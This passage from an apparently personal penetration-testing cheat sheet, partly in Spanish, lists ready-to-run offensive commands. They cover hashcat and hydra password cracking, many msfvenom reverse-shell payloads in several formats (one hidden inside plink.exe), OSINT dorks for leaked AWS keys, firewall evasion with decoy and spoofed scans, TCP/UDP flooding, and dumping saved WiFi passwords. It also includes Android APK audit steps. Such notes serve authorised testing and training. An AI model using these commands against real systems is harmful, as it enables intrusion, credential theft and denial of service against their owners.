hashcat -m 1800 -a 0 hash.txt rockyou.txt --username


#Hashcat MD5 $1$ shadow file
hashcat -m 500 -a 0 hash.txt rockyou.txt --username


# Hashcat MD5 Apache webdav file
hashcat -m 1600 -a 0 hash.txt rockyou.txt


# Hashcat SHA1
hashcat -m 100 -a 0 hash.txt rockyou.txt --force


# Hashcat Wordpress
hashcat -m 400 -a 0 --remove hash.txt rockyou.txt


# RDP user with password list
ncrack -vv --user offsec -P passwords rdp://target


# SSH user with password list
hydra -l user -P pass.txt -t 10 target ssh -s 22


# FTP user with password list
medusa -h target -u user -P passwords.txt -M ftp
```

## **MSFVenom Payloads**

```bash
# List payloads

msfvenom -l payloads | grep jsp

# PHP reverse shell

msfvenom -p php/meterpreter/reverse_tcp LHOST=target LPORT=4443 -f raw -o shell.php


# Java WAR reverse shell

msfvenom -p java/shell_reverse_tcp LHOST=target LPORT=4443 -f war -o shell.war


# Linux bind shell

msfvenom -p linux/x86/shell_bind_tcp LPORT=4443 -f c -b "\x00\x0a\x0d\x20" -e x86/shikata_ga_nai


# Linux FreeBSD reverse shell

msfvenom -p bsd/x64/shell_reverse_tcp LHOST=target LPORT=4443 -f elf -o shell.elf


# Linux C reverse shell

msfvenom -p linux/x86/shell_reverse_tcp LHOST=target LPORT=4443 -e x86/shikata_ga_nai -f c


# Windows non staged reverse shell 

msfvenom -p windows/shell_reverse_tcp LHOST=target LPORT=4443 -e x86/shikata_ga_nai -f exe -o non_staged.exe


# Windows Staged (Meterpreter) reverse shell

msfvenom -p windows/meterpreter/reverse_tcp LHOST=target LPORT=4443 -e x86/shikata_ga_nai -f exe -o meterpreter.exe


# Windows Python reverse shell

msfvenom -p windows/shell_reverse_tcp LHOST=target LPORT=4443 EXITFUNC=thread -f python -o shell.py


# Windows ASP reverse shell

msfvenom -p windows/shell_reverse_tcp LHOST=target LPORT=4443 -f asp -e x86/shikata_ga_nai -o shell.asp


# Windows ASPX reverse shell

msfvenom -f aspx -p windows/shell_reverse_tcp LHOST=target LPORT=4443 -e x86/shikata_ga_nai -o shell.aspx


# Windows JavaScript reverse shell with nops

msfvenom -p windows/shell_reverse_tcp LHOST=target LPORT=4443 -f js_le -e generic/none -n 18


# Windows Powershell reverse shell

msfvenom -p windows/shell_reverse_tcp LHOST=target LPORT=4443 -e x86/shikata_ga_nai -i 9 -f psh -o shell.ps1


# Windows reverse shell excluding bad characters 

msfvenom -p windows/shell_reverse_tcp -a x86 LHOST=target LPORT=4443 EXITFUNC=thread -f c -b "\x00\x04" -e x86/shikata_ga_nai


# Windows x64 bit reverse shell

msfvenom -p windows/x64/shell_reverse_tcp LHOST=target LPORT=4443 -f exe -o shell.exe


# Windows reverse shell embedded into plink

msfvenom -p windows/shell_reverse_tcp LHOST=target LPORT=4443 -f exe -e x86/shikata_ga_nai -i 9 -x /usr/share/windowsbinaries/plink.exe -o shell_reverse_msf_encoded_embedded.exe
```

## **Mobile**

```text
# Guide for Mobile Audits
```

### Android

Tips for a exhaustive audit

#### Extract APK

```text
===============
=== apktool ===
===============

apktool d [APK_name].apk

====================================
=== Extract information from APK ===
====================================

grep -EHirn "accesskey|admin|aes|api_key|apikey|checkClientTrusted|crypt|http:|https:|password|pinning|secret|SHA256|SharedPreferences|superuser|token|X509TrustManager|insert into" APKfolder/
```

#### Compile and Decompile APK

```text
# Decompile

apktool d -f [APK]

# Compile

apktool b <folder_APK_old> -o <APK_name_new>
```

#### Verify Checksum

```text
http://onlinemd5.com/
```

#### Verify Certificate

```text
# Keytool

keytool -printcert -file CERT.RSA

# JarSigner

jarsigner -verify -verbose -certs APK | more

# MobSF

Verify with MobSF

=====================
=== Bad Practices ===
=====================

    - The application is signed with the "Android Debug" certificate. An application in production must never be signed with this certificate.

    - The application is signed with 'SHA1withRSA'. The SHA1 hashing algorithm is known to have collision issues.
```

#### Generate Certificate

```text
keytool -genkey -v -keystore <name>.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
```

#### Sign and Verify Certificate

```text
# Sign

jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore [NAME.keystore] [MyAPK].apk alias_name

# Verify

jarsigner -verify -verbose -certs [APK].apk
```

#### Android Manifest

```text
# Should be set to "false"

android:exported

# Should be limited to be accessed by known applications

android:permission

# Should be set to "signature"

android:protectionLevel
```

#### Drozer

Comprehensive security and attack framework for Android.

```text
# Principal Functions to Test

https://www.semecayounexploit.com/?sec=android-hacking&nota=6

adb devices
adb forward tcp:31415 tcp:31415 (activar drozer Agent en el móvil)

drozer console connect

run app.package.list
run app.package.attacksurface
run app.broadcast.info
run app.activity.info
run app.package.manifest
run app.package.info


# Run Activities

run app.activity.run --component [PACKAGE] [ACTIVITY]


# Verify Providers

run scanner.provider.finduris -a [package] -i
```

#### Static Analysis

```text
# Use JADX-GUI

jadx-gui (open your APK in the GUI)
jadx-gui [APK]
```

#### Search with GREP

```text
# Search a word in all directories with GREP

grep -nr 'yourString*' .
grep -nr 'android:debuggable' . (desde el directorio principal, una vez que el APK se decompiló)
```

#### Analysis of Classes

```text
# See inside of each JAVA class

mv <file.apk> <file.zip>
unzip <file>.zip
d2j-dex2jar <classes.dex>
jd-gui (open --> classes-dex2jar.jar)
```

#### See Confidential Data

```text
# Execute

adb backup <package_name> -f <apkname>.ab

# Download AndroidBackupExtractor (abe.jar) and do this

java -jar abe.jar unpack <apkname>.ab <apkname>.tar

# Convert to tar

tar -xvf <apkname.>tar

# You get a folder new, get inside and you will be see the information confidential
```

#### Random Number Generator

```text
# Create 20 payloads of 32 characters (Javascript) (http://qbnz.com/highlighter/demo.php)
```

```javascript
function randomString(length, chars) {
    var result = '';
    for (var i = length; i > 0; --i) result += chars[Math.floor(Math.random() * chars.length)];
    return result;
}
for (i=0; i < 20; i++) {
var rString = randomString(32, '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ');
console.log(rString)}
```

### iOS

```text
Ver el plist (lista de propiedades)
```

## **OSINT**

Guide for OSINT \([https://gowsundar.gitbook.io/book-of-bugbounty-tips/elastic-search](https://gowsundar.gitbook.io/book-of-bugbounty-tips/elastic-search)\)

### Elastic Search OSINT

```text
##############################################################################
### Found an ElasticSearch instance while doing recon, hit these endpoints ###
##############################################################################

http://elastic.host/_cat/api
http://elastic.host/_cat/indices
http://elastic.host/_mapping

#############################
### Log instances exposed ###
#############################

Dork: inurl:app/kibana
Shodan: title:"kibana" port:"443"
```

### Dorks for OSINT

```text
###########################################
### Looking for Passwords, API, Secrets ###
###########################################

site:http://ideone.com “apikey” 
site:http://ideone.com “aws_access_key_id”
site:http://pastebin.com "aws_access_key_id”

########################################################################################
### Search the copyright string on Google to find other websites owned by the target ###
########################################################################################

intext:"© Example Inc."
```

### Find Subdomains

```text
#################################################################
### Use the Google Analytics ID to expand your attack surface ###
#################################################################

1) Get sourceCode from a webPage
2) Search 'UA-' or 'ga("create"' the ID UA-XXXXXX-XX
3) Go to "http://site-overview.com/" or "https://dnslytics.com/reverse-analytics" and get more domains/subdomains with this ID

Resource: https://twitter.com/HusseiN98D/status/1193318004257435648
```

### Search Engines
```
https://spyse.com/
```

### Find People
```
https://pipl.com/
https://www.beenverified.com/
https://www.spokeo.com/
https://www.411.com/
https://backgroundchecks.org/
https://www.zabasearch.com/
https://webmii.com/?language=es
```


## **API Security**

Guide for API Audit

### Search API Documentation

```text
############
### Dork ###
############

site:http://example.com inurl:swagger

/swagger-ui/swagger.json
/apidocs/swagger.json
/api-docs/swagger.json
/swagger-ui
/api-docs
/apidocs
/swagger
/v1/swagger.json
```

### Invalid ContentType

```text
########################################################################################################################
### If you playing with API ENDPOINT try to send INVALID CONTENT TYPE end-up by getting hidden endpoints in RESPONSE ###
########################################################################################################################

Content-Type: */*
```

### Fuzzing contra ENDPOINTS ocultos
```text
/api/v1/confirm-code
/api/v1/reset-pwd
/ping (Spring Boot)
/health (Spring Boot)
```

Look this:
[https://docs.google.com/spreadsheets/d/1jn3JnWzQFZW41gKo5Fhxwf2ke2w-pvrpCGhBmKhyIBE/edit\#gid=0](https://docs.google.com/spreadsheets/d/1jn3JnWzQFZW41gKo5Fhxwf2ke2w-pvrpCGhBmKhyIBE/edit#gid=0)
https://github.com/smodnix/31-days-of-API-Security-Tips


## **Segmentation Firewall Evasion**

Guide for Segmentation Firewall in PCI Segmentation Audit

### ICMP Scan
```
hping3 --scan 1-3000 -S [IP_VÍCTIMA]
```
Se utiliza el sondeo a través de ICMP para verificar interconexión.

### Crafteo de paquetes UDP
```
hping3 [IP_VÍCTIMA] --udp --rand-source --data 500
```

### DECOY
```
nmap -D RND:10 [IP_VÍCTIMA]
```
Se falsifican paquetes de otros hosts.

### Fragmentacion de Paquetes
```
nmap -f [IP_VÍCTIMA]
```
Se fragmentan los paquetes enviados.

### MTU
```
nmap --mtu 16 [IP_VÍCTIMA]
```
Se establece la unidad de transmisión máxima específica para cada paquete

### Bad Checksums
```
nmap --badsum [IP_VÍCTIMA]
```
Se utiliza una suma de comprobación errónea.

### IDL Zombie Scan
```
nmap -sI [Zombie IP] [IP_VÍCTIMA]
```
Se utiliza otro host de la red inactivo para realizar un escaneo al objetivo.

### Source port number specification
```
nmap --source-port 53 [IP_VÍCTIMA]
```
Se cambia el puerto de origen desde el cual se realizan los escaneos.

### Append Random Data
```
nmap --data-length 37 [IP_VÍCTIMA]
```
Se agregan datos adicionales a cada paquete que se transmite.

### MAC Address Spoofing
```
nmap -sT -Pn --spoof-mac Dell [IP_VÍCTIMA]
```
Se suplanta la dirección MAC del equipo atacante con una del proveedor Dell.

### Flooding TCP
```
hping3 -p [PORT_VICTIM] -S --flood [IP_VICTIM]
```
El objetivo devuelve una flag RST indicando que no es vulnerable a la inundación de solicitudes.

### Flooding UDP
```
sudo hping3 -2 --flood [IP_VICTIM]
```

### Address IPv4 in Decimal, Octal and Hexadecimal
```
https://www.browserling.com/tools/ip-to-dec
```



## **WiFi**

Guide for WiFi Penetration Testing

### See Passwords Clean
```
- Run like ADMINISTRATOR a cmd:

netsh wlan show profiles
netsh wlan show profiles [NOMBRE_RED] key="clear"
```


## **Maps Of Attacks**

Maps of DoS/DDoS attacks.

### CheckPoint
```
https://threatmap.checkpoint.com/
```

### Fortinet
```
https://threatmap.fortiguard.com/
```

## **Radio**

Recopilation of CTF challenges about Radio

### GQRX
```
http://gqrx.dk/

Greate article: https://leonjza.github.io/blog/2016/10/02/reverse-engineering-static-key-remotes-with-gnuradio-and-rfcat/

```

### ooktools
```
https://github.com/leonjza/ooktools
```


